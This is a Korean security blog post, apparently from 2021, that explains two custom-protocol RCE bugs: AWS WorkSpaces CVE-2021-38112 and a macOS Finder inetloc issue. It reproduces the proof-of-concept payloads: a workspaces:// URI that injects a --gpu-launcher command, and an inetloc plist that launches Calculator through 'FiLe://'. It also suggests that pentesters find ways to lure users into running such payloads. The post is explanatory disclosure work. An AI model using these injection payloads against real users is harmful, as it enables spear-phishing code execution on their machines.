@@ -1,0 +1,229 @@
+<!doctype html><html lang=kr><meta charset=utf-8>
+<meta name=viewport content="width=device-width">
+<title>커스텀 프로토콜을 활용한 공격? AWS Workspace RCE and inetloc RCE | 데구루루x2 놀이터</title>
+<meta name=generator content="Hugo Eureka 0.8.2">
+<link rel=stylesheet href=/css/eureka.min.css>
+<script defer src=/js/eureka.min.js></script>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload="this.onload=null,this.rel='stylesheet'">
+<link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css media=print onload="this.media='all',this.onload=null" crossorigin>
+<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js crossorigin></script>
+<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/languages/dart.min.js crossorigin></script>
+<script defer src=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js integrity="sha256-uNYoXefWRqv+PsIF/OflNmwtKM4lStn9yrz2gVl6ymo=" crossorigin></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X media=print onload="this.media='all',this.onload=null" crossorigin>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
+<script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js integrity="sha256-Zmpaaj+GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE=" crossorigin></script>
+<link rel=preconnect href=https://www.google-analytics.com crossorigin>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-164568875-1"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-164568875-1')</script>
+<link rel=icon type=image/png sizes=32x32 href=/images/deguru22_hufc063740f6f81162e489d60dbe402c0f_388931_32x32_fill_q75_box_center.jpg>
+<link rel=apple-touch-icon sizes=180x180 href=/images/deguru22_hufc063740f6f81162e489d60dbe402c0f_388931_180x180_fill_q75_box_center.jpg>
+<meta name=description content="커스텀 프로토콜을 활용한 RCE 공격들에 대해 살펴봅니다.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"/kr/posts/"},{"@type":"ListItem","position":2,"name":"커스텀 프로토콜을 활용한 공격? AWS Workspace RCE and inetloc RCE","item":"/kr/2021/09/22/%EC%BB%A4%EC%8A%A4%ED%85%80-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9-aws-workspace-rce-and-inetloc-rce/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"/kr/2021/09/22/%EC%BB%A4%EC%8A%A4%ED%85%80-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9-aws-workspace-rce-and-inetloc-rce/"},"headline":"커스텀 프로토콜을 활용한 공격? AWS Workspace RCE and inetloc RCE | 데구루루x2 놀이터","datePublished":"2021-09-22T00:49:21+09:00","dateModified":"2021-09-22T00:49:21+09:00","wordCount":1729,"publisher":{"@type":"Person","name":"deguru22","logo":{"@type":"ImageObject","url":"/images/deguru22.jpg"}},"description":"커스텀 프로토콜을 활용한 RCE 공격들에 대해 살펴봅니다."}</script><meta property="og:title" content="커스텀 프로토콜을 활용한 공격? AWS Workspace RCE and inetloc RCE | 데구루루x2 놀이터">
+<meta property="og:type" content="article">
+<meta property="og:image" content="/images/deguru22.jpg">
+<meta property="og:url" content="/kr/2021/09/22/%EC%BB%A4%EC%8A%A4%ED%85%80-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B3%B5%EA%B2%A9-aws-workspace-rce-and-inetloc-rce/">
+<meta property="og:description" content="커스텀 프로토콜을 활용한 RCE 공격들에 대해 살펴봅니다.">
+<meta property="og:locale" content="kr">
+<meta property="og:site_name" content="데구루루x2 놀이터">
+<meta property="article:published_time" content="2021-09-22T00:49:21+09:00">
+<meta property="article:modified_time" content="2021-09-22T00:49:21+09:00">
+<meta property="article:section" content="posts">
+<body class="flex flex-col min-h-screen">
+<header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
+<div class="w-full max-w-screen-xl mx-auto"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=='Auto'||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName('html')[0].classList.add('dark')</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+<a href=/kr class="mr-6 text-primary-text text-xl font-bold">데구루루x2 놀이터</a>
+<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+<i class="fas fa-bars"></i>
+</button>
+<div id=target class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+<div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
+<a href=/kr/#about class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">About</a>
+<a href=/kr/posts/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent mr-4">Posts</a>
+</div>
+<div class=flex>
+<div class="relative pt-4 md:pt-0">
+<div class="cursor-pointer hover:text-eureka" id=lightDarkMode>
+<i class="fas fa-adjust"></i>
+</div>
+<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open>
+</div>
+<div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions>
+<span class="px-4 py-1 hover:text-eureka" name=Light></span>
+<span class="px-4 py-1 hover:text-eureka" name=Dark></span>
+<span class="px-4 py-1 hover:text-eureka" name=Auto></span>
+</div>
+</div>
+</div>
+</div>
+<div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile>
+</div>
+</nav>
+<script>let element=document.getElementById('lightDarkMode');storageColorScheme==null||storageColorScheme=='Auto'?document.addEventListener('DOMContentLoaded',()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change',switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'sun'),element.firstElementChild.classList.add('fa-sun')):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove('fa-adjust'),element.firstElementChild.setAttribute("data-icon",'moon'),element.firstElementChild.classList.add('fa-moon')),document.addEventListener('DOMContentLoaded',()=>{getcolorscheme(),switchBurger()})</script>
+</div>
+</header>
+<main class="flex-grow pt-16">
+<div class=pl-scrollbar>
+<div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">
+<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
+<div class="col-span-2 lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
+<h1 class="font-bold text-3xl text-primary-text">커스텀 프로토콜을 활용한 공격? AWS Workspace RCE and inetloc RCE</h1>
+<div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
+<div class="mr-6 my-2">
+<i class="fas fa-calendar mr-1"></i>
+<span>2021-09-22</span>
+</div>
+<div class="mr-6 my-2">
+<i class="fas fa-clock mr-1"></i>
+<span></span>
+</div>
+<div class="mr-6 my-2">
+<i class="fas fa-folder mr-1"></i>
+<a href=/kr/categories/cve/ class=hover:text-eureka>CVE</a>
+<span>, </span>
+<a href=/kr/categories/rce/ class=hover:text-eureka>RCE</a>
+<span>, </span>
+<a href=/kr/categories/inetloc/ class=hover:text-eureka>inetloc</a>
+<span>, </span>
+<a href=/kr/categories/protocols/ class=hover:text-eureka>protocols</a>
+<span>, </span>
+<a href=/kr/categories/vulnerability/ class=hover:text-eureka>vulnerability</a>
+</div>
+</div>
+<div class=content>
+<h2 id=요약>요약</h2>
+<ul>
+<li>
+<p>커스텀 프로토콜을 활용한 RCE 취약점이 최근 눈에 띄어, 흥미로워서 공유합니다.</p>
+<ul>
+<li>
+<p>사례1) AWS Workspace에서 사용하는 <code>workspaces://</code> 프로토콜을 활용한 RCE 공격 (CVE-2021-38112)</p>
+</li>
+<li>
+<p>사례2) 맥에서 <code>inetloc</code> 확장자 파일 내에서 <code>file://</code> 프로토콜을 활용한 RCE 공격 (최초 제보자: 박민찬, 개인 연구자)</p>
+</li>
+</ul>
+</li>
+<li>
+<p>커스텀 프로토콜 개발 시 파라미터를 통한 명령 실행 가능 여부를 늘 주의해야 하며, 로컬에서 임의 변경 후 실행 시 대응하기 어려운 클라이언트 프로그램의 구조적 한계를 고려하여 언제나 최소한의 기능만 처리할 수 있도록 최소 권한의 법칙(Principle of least privilege)을 잊지 말아야 합니다.</p>
+</li>
+</ul>
+<h2 id=내용>내용</h2>
+<h3 id=사례1-aws-workspace-rce-cve-2021-38112>사례1. AWS Workspace RCE (CVE-2021-38112)</h3>
+<blockquote>
+<p>아래 취약점은 현재(2021-09-22) 패치가 완료 되었다고 합니다.</p>
+</blockquote>
+<p><a href=https://aws.amazon.com/ko/workspaces>AWS Workspace</a>는 Citrix Workspace와 같은 데스크톱 가상화 서비스 입니다. 이 서비스를 이용하면 작업자가 언제 어디에서나 인터넷만 연결되어 있는 환경이라면 가상화된 PC에 접속하여 업무를 연속적으로 이어갈 수 있습니다. 특히 최근 COVID-19로 인한 재택근무 증가로 인해 이러한 데스크톱 가상화 서비스 사용량이 증가하고 있습니다.</p>
+<p>이 취약점을 최초로 제보한 <a href=https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/>Rhino Security Labs</a>에서 해당 취약점에 대한 상세한 내용을 공개 하였습니다. 아래의 모든 내용은 <a href=https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/>링크</a>의 내용을 바탕으로 작성되었으며, <a href=https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/>링크</a>에 상세 내용이 작성돼있으니 읽어 보는것을 추천드립니다!</p>
+<p>결론만 요약 하자면, 아래와 같습니다. Amawon Workspace를 사용하기 위해서는 데스크톱 클라이언트를 설치해야 하고, 웹을 통해 로그인 후 해당 클라이언트를 실행하기 위해 커스텀 프로토콜을 사용합니다. 커스텀 프로토콜 내 <code>--gpu-launcher</code> 파라미터를 통해서 Amazon Workspace 앱 실행 시 원하는 명령 실행(아래 예제에서는 <code>calc.exe</code>)이 가능합니다.</p>
+<p>최초에 웹 브라우저를 통해 아래의 명령어를 실행합니다. <code>--gpu-launcher</code> 파라미터에 <code>calc.exe</code> 명령을 주입했습니다.</p>
+<pre><code>workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
+</code></pre>
+<p>위의 스키마를 통해 실제 프로그램이 실행 될 때 아래의 명령어가 실행됩니다. 최초에 우리가 입력했던 파라미터들이 <strong>인코딩 된 채로</strong> 그대로 uri에 전달됨을 확인할 수 있습니다.</p>
+<pre><code>&quot;C:\Program Files (x86)\Amazon Web Services, Inc\Amazon WorkSpaces\workspaces.exe&quot;
+--uri “workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE”
+</code></pre>
+<p>그 후 인코딩된 파라미터를 디코딩하여 프로그램이 두 번째 실행을 합니다. 아래 명령어에 <code>--gpu-launcher="calc.exe"</code> 가 포함된 것을 확인할 수 있습니다.</p>
+<pre><code>&quot;C:\Program Files (x86)\Amazon Web Services, Inc\Amazon WorkSpaces\workspaces.exe&quot;
+--ws-pipe-name UUID --ws-pipe-handle 4576 -r REGISTRATION_CODE 
+--auth-url https://&lt;appssite&gt;.awsapps.com:443/login/?client_id=&lt;clientid&gt;&amp;redirect_uri=https%3a%2f%2fskylight.local&amp;locale=en_US 
+--org-name &lt;org name&gt; --session-id &lt;session id&gt; --metricAppName Client -u anything 
+--gpu-launcher=&quot;calc.exe&quot; --login-mode 5
+</code></pre>
+<p>위 명령이 실행되면 실제 <code>calc.exe</code>가 실행됩니다. 실행되는 화면은 위 글의 원문<a href=https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/>(Rhino Security Labs)</a>에 가시면 보실 수 있습니다!</p>
+<h3 id=사례2-macos-finder-rce>사례2. macOS Finder RCE</h3>
+<blockquote>
+<p>아래 취약점은 패치를 하였으나, 여전히 File 프로토콜의 대소문자 혼용(FiLe://)을 통해 악용 가능하다고 합니다. (2021-09-22 기준)</p>
+</blockquote>
+<p>맥에는 <code>inetloc</code> 확장자 파일이 존재하는데, 해당 확장자는 맥의 Finder 혹은 사파리에서 URL 바로가기와 같이 특정 URL 호출 시 사용하는 확장자라고 합니다. 과거에는 종종 사용됐던거 같은데, 최근에는 많이 사용되는 것 같지는 않습니다(요즘도 자주 활용되는 사례가 있다면 공유해 주시면 정말 감사하겠습니다!).</p>
+<p><a href=https://ssd-disclosure.com/ssd-advisory-macos-finder-rce/>취약점을 발견한 분이 공유해 주신 페이로드</a>를 활용하여 실제 작동 하는지 확인 결과, 더블클릭해서 파일 실행 시 바로 계산기 앱이 뜨는 것을 확인 했습니다. 테스트에 사용한 맥은 최신 버전 (macOS 11.6 21G165)이었으므로, 최신 버전에서 아직 패치가 미흡한 것을 확인했습니다.</p>
+<p><img src=https://user-images.githubusercontent.com/42140558/134312523-b6dcb698-aa5e-452e-a339-954fcd555fcc.png alt="계산기 띄우기 성공"></p>
+<p>코드를 살펴 보면, File 프로토콜을 활용하여 바로 계산기 앱을 호출했습니다. File 프로토콜을 사용하여 기기 내의 파일을 접근, 실행 할 수 있으므로 맥을 사용하는 특정 타겟을 대상으로 스피어 피싱을 할 때 악용될 가능성이 있어 보입니다.</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
+&lt;plist version=&quot;1.0&quot;&gt;
+  &lt;dict&gt;
+    &lt;key&gt;URL&lt;/key&gt;
+    &lt;string&gt;FiLe:////////////////////////System/Applications/Calculator.app&lt;/string&gt;
+  &lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<h2 id=결론>결론</h2>
+<h3 id=개발자-관점>개발자 관점</h3>
+<ul>
+<li>커스텀 프로토콜 개발 시 파라미터를 통한 의도치 않은 기능 수행(임의의 명령 실행 가능 여부 등)를 늘 주의해야 함</li>
+<li>로컬에서 임의 변경 후 실행 시 대응하기 어려운 클라이언트 프로그램의 구조적 한계를 고려하여 언제나 최소한의 기능만 처리할 수 있도록 최소 권한의 법칙(Principle of least privilege)을 잊지 말아야 함</li>
+</ul>
+<h3 id=침투-테스터-관점>침투 테스터 관점</h3>
+<ul>
+<li>커스텀 프로토콜이 존재할 경우 들어가는 파라미터를 면밀히 분석하여, 악용할 수 있는 여지가 있는지 확인해야 함 (특히 파라미터에 직접적으로 프로그램이 실행된다면 더욱 수상하니 반드시 확인할 것!)</li>
+<li>악용할 여지가 있다면 악성 페이로드를 포함한 프로토콜을 사용자가 실행할 수 있도록 유도할 수 있는 방법을 찾아보기</li>
+</ul>
+<h2 id=참고-문서>참고 문서</h2>
+<ul>
+<li>
+<p><a href=https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/>CVE-2021-38112:
+AWS WorkSpaces Remote Code Execution</a></p>
+</li>
+<li>
+<p><a href=https://ssd-disclosure.com/ssd-advisory-macos-finder-rce/>macOS Finder RCE</a></p>
+</li>
+</ul>
+</div>
+<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
+<div>
+</div>
+<div class="md:text-right mt-4 md:mt-0">
+<span class="block font-bold"></span>
+<a href=/kr/2021/09/19/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-4-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%AA%85%EB%A0%B9%EC%96%B4-%EB%B6%88%EB%9F%AC%EC%98%A4%EA%B8%B0-%EB%B0%8F-%EC%A0%80%EC%9E%A5/ class=block>Prev ❯❯ : ARM 어셈블리 튜토리얼 (4) 메모리 명령어: 불러오기 및 저장</a>
+</div>
+<div class="md:text-right mt-4 md:mt-0"><br><br></div>
+</div>
+<div id=disqus_thread></div>
+<script>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//deguru22-notes.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<div class=col-span-2>
+<div class="sticky top-16 z-10 hidden lg:block px-6 py-4 bg-primary-bg">
+<span class="text-lg font-semibold"></span>
+</div>
+<div class="sticky-toc hidden lg:block px-6 pb-6">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#요약>요약</a></li>
+<li><a href=#내용>내용</a>
+<ul>
+<li><a href=#사례1-aws-workspace-rce-cve-2021-38112>사례1. AWS Workspace RCE (CVE-2021-38112)</a></li>
+<li><a href=#사례2-macos-finder-rce>사례2. macOS Finder RCE</a></li>
+</ul>
+</li>
+<li><a href=#결론>결론</a>
+<ul>
+<li><a href=#개발자-관점>개발자 관점</a></li>
+<li><a href=#침투-테스터-관점>침투 테스터 관점</a></li>
+</ul>
+</li>
+<li><a href=#참고-문서>참고 문서</a></li>
+</ul>
+</nav>
+</div>
+<script>window.addEventListener('DOMContentLoaded',()=>{enableStickyToc()})</script>
+</div>
+</div>
+<script>document.addEventListener('DOMContentLoaded',()=>{hljs.initHighlightingOnLoad()})</script>
+</div>
+</div>
+</main>
+<footer class=pl-scrollbar>
+<div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
+<p class="text-sm text-tertiary-text">&copy; 2021 deguru22
+&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p>
+</div></div>
+</footer>
+</body>
+</html>
